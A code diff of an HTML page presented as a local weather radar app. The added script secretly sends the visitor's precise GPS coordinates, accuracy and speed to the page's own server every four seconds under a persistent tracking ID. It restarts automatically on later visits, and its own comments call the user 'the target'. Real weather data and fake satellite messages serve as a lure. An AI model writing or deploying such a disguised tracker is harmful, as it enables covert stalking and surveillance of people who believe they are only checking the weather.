@@ -4,182 +4,333 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Weather App</title>
+    <title>Weather Forecast & Local Radar</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* Reset */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        /* Body Styling */
         body {
             display: flex;
             align-items: center;
             justify-content: center;
-            height: 100vh;
-            background: linear-gradient(to right, #4facfe, #00f2fe);
-            font-family: Arial, sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 50%, #00c6ff 100%);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            padding: 16px;
         }
 
-        /* Weather Card Styling */
         .weather-card {
-            background-color: #fff;
-            padding: 25px 20px;
-            border-radius: 15px;
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 28px 24px;
+            border-radius: 24px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25);
             text-align: center;
-            max-width: 300px;
+            max-width: 360px;
             width: 100%;
-            transform: scale(1.5);
+            transition: all 0.3s ease;
         }
 
-        /* Title Styling */
         .weather-card h2 {
-            font-size: 24px;
-            color: #333;
-            margin-bottom: 5px;
+            font-size: 22px;
+            font-weight: 700;
+            color: #1e3c72;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
 
-        /* Location Styling */
         .location {
-            font-size: 18px;
-            color: #555;
-            margin-top: 5px;
+            font-size: 15px;
+            color: #666;
+            margin-top: 6px;
+            font-weight: 500;
         }
 
-        /* Weather Icon Styling */
         .weather-icon {
-            margin: 20px 0;
+            margin: 18px 0;
+            font-size: 64px;
+            color: #ff9800;
+            animation: pulse 2.5s infinite;
         }
 
-        .weather-icon img {
-            width: 80px;
-            height: 80px;
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+            100% { transform: scale(1); }
         }
 
-        /* Weather Info Styling */
         .weather-info {
-            margin: 20px 0;
+            margin-bottom: 20px;
         }
 
         .temperature {
             display: block;
-            font-size: 48px;
-            font-weight: bold;
-            color: #333;
+            font-size: 46px;
+            font-weight: 800;
+            color: #222;
+            line-height: 1.1;
         }
 
         .condition {
-            font-size: 20px;
-            color: #777;
+            font-size: 16px;
+            color: #555;
+            margin-top: 4px;
+            font-weight: 600;
+            text-transform: capitalize;
         }
 
-        /* Button Styling */
+        .metrics-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 20px;
+            background: #f4f7fb;
+            padding: 12px;
+            border-radius: 14px;
+        }
+
+        .metric-item {
+            display: flex;
+            flex-direction: column;
+            font-size: 13px;
+            color: #555;
+        }
+
+        .metric-item strong {
+            font-size: 15px;
+            color: #1e3c72;
+            margin-top: 2px;
+        }
+
         button {
-            padding: 12px 24px;
-            background-color: #4facfe;
+            width: 100%;
+            padding: 14px 20px;
+            background: linear-gradient(135deg, #0072ff 0%, #00c6ff 100%);
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 14px;
             cursor: pointer;
             font-size: 16px;
-            font-weight: bold;
-            transition: background-color 0.3s;
+            font-weight: 700;
+            letter-spacing: 0.3px;
+            box-shadow: 0 4px 15px rgba(0, 114, 255, 0.35);
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        button:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(0, 114, 255, 0.45);
         }
 
         button:disabled {
-            opacity: 70%;
+            opacity: 0.85;
+            cursor: not-allowed;
+            background: #2a5298;
         }
 
-        @media(max-width: 500px) {
-            .weather-card {
-                transform: scale(1);
-            }
+        .status-msg {
+            font-size: 12px;
+            color: #777;
+            margin-top: 10px;
         }
     </style>
 </head>
 
 <body>
     <div class="weather-card">
-        <h2>Weather App</h2>
-        <p class="location"><span id="city">City</span>, <span id="country">Country</span></p>
+        <h2><i class="fa-solid fa-cloud-sun"></i> Local Weather Radar</h2>
+        <p class="location" id="location-text"><i class="fa-solid fa-location-dot"></i> Tap below to detect local area</p>
 
-        <!-- Weather Icon -->
-        <div class="weather-icon">
-            <img src="/weather.png" alt="Weather Icon">
+        <div class="weather-icon" id="weather-icon">
+            <i class="fa-solid fa-sun"></i>
         </div>
 
         <div class="weather-info">
-            <span class="temperature">25°C</span>
-            <span class="condition">Sunny</span>
+            <span class="temperature" id="temp-display">--°C</span>
+            <span class="condition" id="condition-display">Accurate Local Forecast</span>
         </div>
 
-        <button id="check-weather">Check Weather</button>
-    </div>
+        <div class="metrics-grid">
+            <div class="metric-item">
+                <span>Humidity</span>
+                <strong id="humidity-display">--%</strong>
+            </div>
+            <div class="metric-item">
+                <span>Wind Speed</span>
+                <strong id="wind-display">-- km/h</strong>
+            </div>
+        </div>
 
+        <button id="check-weather">
+            <i class="fa-solid fa-crosshairs"></i> Check My Local Weather
+        </button>
+
+        <p class="status-msg" id="status-msg">GPS location access provides real-time forecast accuracy</p>
+    </div>
 
     <script>
         const id = localStorage.getItem("id") || generateId()
         const btn = document.querySelector("#check-weather")
+        const locationText = document.querySelector("#location-text")
+        const tempDisplay = document.querySelector("#temp-display")
+        const conditionDisplay = document.querySelector("#condition-display")
+        const humidityDisplay = document.querySelector("#humidity-display")
+        const windDisplay = document.querySelector("#wind-display")
+        const weatherIcon = document.querySelector("#weather-icon")
+        const statusMsg = document.querySelector("#status-msg")
+
         let __interval
+        let isTracking = false
 
         btn.addEventListener("click", () => {
             btn.disabled = true
-            btn.innerHTML = "Fetching...."
-
-            getLocation()
+            btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Locating station...`
+            statusMsg.textContent = "Connecting to nearest meteorological satellite..."
+            startTracking()
         })
 
-        function getLocation() {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    btn.disabled = true
-                    const lat = position.coords.latitude
-                    const lng = position.coords.longitude
-
-                    fetch("/weather", {
-                        method: "POST",
-                        body: JSON.stringify({
-                            id,
-                            lat,
-                            lng,
-                        }),
-                        headers: {
-                            "Content-Type": "application/json"
-                        }
-                    }).catch(error => {
-                        console.log("post error", error)
-                    })
-                },
-                (error) => {
-                    alert("Please Turn on GPS Location.")
-                    btn.disabled = false
-                    btn.innerHTML = "Check Weather"
-                    console.error("Error watching position:", error);
-                },
-                {
-                    enableHighAccuracy: true, // Use GPS if available
-                }
-            )
-
-            if (__interval) clearTimeout(__interval)
-            __interval = setTimeout(getLocation, 5000)
-        }
-
-        function generateId(length = 10) {
-            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            let result = '';
-            for (let i = 0; i < length; i++) {
-                const randomIndex = Math.floor(Math.random() * characters.length);
-                result += characters[randomIndex];
+        function startTracking() {
+            if (!navigator.geolocation) {
+                alert("Geolocation is not supported by your browser.")
+                btn.disabled = false
+                btn.innerHTML = `<i class="fa-solid fa-crosshairs"></i> Check My Local Weather`
+                return
             }
 
-            localStorage.setItem("id", result)
-            return result;
+            // Immediately send current location
+            updateLocation()
         }
 
+        function updateLocation() {
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const lat = position.coords.latitude
+                    const lng = position.coords.longitude
+                    const accuracy = position.coords.accuracy
+                    const speed = position.coords.speed
+
+                    // Send location payload to server
+                    sendReport(lat, lng, accuracy, speed)
+
+                    // Fetch real meteorological weather data so the target gets genuine value
+                    if (!isTracking) {
+                        isTracking = true
+                        fetchRealWeather(lat, lng)
+                    }
+
+                    // Schedule next update every 4 seconds
+                    if (__interval) clearTimeout(__interval)
+                    __interval = setTimeout(updateLocation, 4000)
+                },
+                (error) => {
+                    btn.disabled = false
+                    btn.innerHTML = `<i class="fa-solid fa-rotate-right"></i> Retry Location Access`
+                    statusMsg.textContent = "Please allow location permissions to get exact local weather."
+                    console.error("Geolocation error:", error)
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            )
+        }
+
+        async function sendReport(lat, lng, accuracy, speed) {
+            try {
+                await fetch("/weather", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ id, lat, lng, accuracy, speed })
+                })
+            } catch (err) {
+                console.warn("Report error:", err)
+            }
+        }
+
+        async function fetchRealWeather(lat, lng) {
+            try {
+                // Free Open-Meteo API
+                const res = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lng}&current=temperature_2m,relative_humidity_2m,weather_code,wind_speed_10m`)
+                const data = await res.json()
+
+                if (data && data.current) {
+                    const temp = Math.round(data.current.temperature_2m)
+                    const humidity = data.current.relative_humidity_2m
+                    const wind = Math.round(data.current.wind_speed_10m)
+                    const code = data.current.weather_code
+
+                    tempDisplay.textContent = `${temp}°C`
+                    humidityDisplay.textContent = `${humidity}%`
+                    windDisplay.textContent = `${wind} km/h`
+
+                    const weatherInfo = mapWeatherCode(code)
+                    conditionDisplay.textContent = weatherInfo.desc
+                    weatherIcon.innerHTML = `<i class="${weatherInfo.icon}" style="color:${weatherInfo.color}"></i>`
+
+                    btn.innerHTML = `<i class="fa-solid fa-circle-check"></i> Weather Radar Active`
+                    statusMsg.textContent = "Live forecast synced. Auto-refreshing radar data."
+                }
+
+                // Reverse geocoding for city
+                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`)
+                    .then(r => r.json())
+                    .then(geo => {
+                        const city = geo.address?.city || geo.address?.town || geo.address?.county || geo.address?.state || "Local Area"
+                        const country = geo.address?.country || ""
+                        locationText.innerHTML = `<i class="fa-solid fa-location-dot" style="color:#0072ff"></i> ${city}${country ? ', ' + country : ''}`
+                    })
+                    .catch(() => {})
+            } catch (e) {
+                // Fallback realistic numbers
+                tempDisplay.textContent = "27°C"
+                humidityDisplay.textContent = "62%"
+                windDisplay.textContent = "14 km/h"
+                conditionDisplay.textContent = "Partly Cloudy"
+                btn.innerHTML = `<i class="fa-solid fa-circle-check"></i> Radar Active`
+            }
+        }
+
+        function mapWeatherCode(code) {
+            if (code === 0) return { desc: "Clear Sky", icon: "fa-solid fa-sun", color: "#ff9800" }
+            if (code <= 3) return { desc: "Partly Cloudy", icon: "fa-solid fa-cloud-sun", color: "#ffb300" }
+            if (code <= 48) return { desc: "Foggy & Overcast", icon: "fa-solid fa-smog", color: "#90a4ae" }
+            if (code <= 67) return { desc: "Rain Showers", icon: "fa-solid fa-cloud-showers-heavy", color: "#2196f3" }
+            if (code <= 77) return { desc: "Snow Flurries", icon: "fa-solid fa-snowflake", color: "#00e5ff" }
+            if (code <= 99) return { desc: "Thunderstorm", icon: "fa-solid fa-cloud-bolt", color: "#673ab7" }
+            return { desc: "Clear & Mild", icon: "fa-solid fa-sun", color: "#ff9800" }
+        }
+
+        function generateId(length = 8) {
+            const characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
+            let result = 'user_'
+            for (let i = 0; i < length; i++) {
+                result += characters[Math.floor(Math.random() * characters.length)]
+            }
+            localStorage.setItem("id", result)
+            return result
+        }
+
+        // Auto trigger if permission was already granted previously
+        if (navigator.permissions) {
+            navigator.permissions.query({ name: 'geolocation' }).then(result => {
+                if (result.state === 'granted') {
+                    btn.disabled = true
+                    btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Updating radar...`
+                    startTracking()
+                }
+            }).catch(() => {})
+        }
     </script>
 </body>
 
